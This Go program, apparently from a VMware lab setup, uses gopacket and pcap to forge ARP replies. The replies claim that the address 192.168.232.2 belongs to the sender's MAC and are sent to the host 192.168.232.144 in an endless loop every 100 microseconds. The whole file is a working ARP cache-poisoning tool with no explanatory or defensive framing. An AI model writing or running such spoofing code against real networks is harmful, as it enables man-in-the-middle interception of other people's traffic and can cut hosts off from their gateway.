package main

import (
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"net"
	"time"
)

func main() {
	//VMware Network Adapter VMnet8  --   Ethernet0   --  WLAN
	//window10 mac 0x00, 0x0c, 0x29, 0x8a, 0x8c, 0xef
	// window server 0x00, 0x0c, 0x29, 0x2f, 0xdd, 0xf2
	iface, err := net.InterfaceByName("VMware Network Adapter VMnet8")
	//fmt.Println(iface.Name, "iface.Name", iface.HardwareAddr, "iface.HardwareAddr")
	if err != nil {
		fmt.Println(err, 1)
		return
	}

	handle, err := pcap.OpenLive("\\Device\\NPF_{954BA663-E616-46D4-B747-52FCF493D58F}", 65536, true, pcap.BlockForever)
	if err != nil {
		fmt.Println(err, 2)
		return
	}
	eth := &layers.Ethernet{
		SrcMAC:       iface.HardwareAddr,
		DstMAC:       net.HardwareAddr{0x00, 0x0c, 0x29, 0x2f, 0xdd, 0xf2},
		EthernetType: layers.EthernetTypeARP,
	}
	a := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     uint8(6),
		ProtAddressSize:   uint8(4),
		Operation:         uint16(2),
		SourceHwAddress:   iface.HardwareAddr,
		SourceProtAddress: net.ParseIP("192.168.232.2").To4(),
		DstHwAddress:      net.HardwareAddr{0x00, 0x0c, 0x29, 0x8a, 0x8c, 0xef},
		DstProtAddress:    net.ParseIP("192.168.232.144").To4(),
	}

	buffer := gopacket.NewSerializeBuffer()
	var opt gopacket.SerializeOptions
	gopacket.SerializeLayers(buffer, opt, eth, a)
	outgoingPacket := buffer.Bytes()
	for {
		err = handle.WritePacketData(outgoingPacket)
		if err != nil {
			fmt.Println(err, 3)
		}
		time.Sleep(time.Microsecond * 100)
	}
}
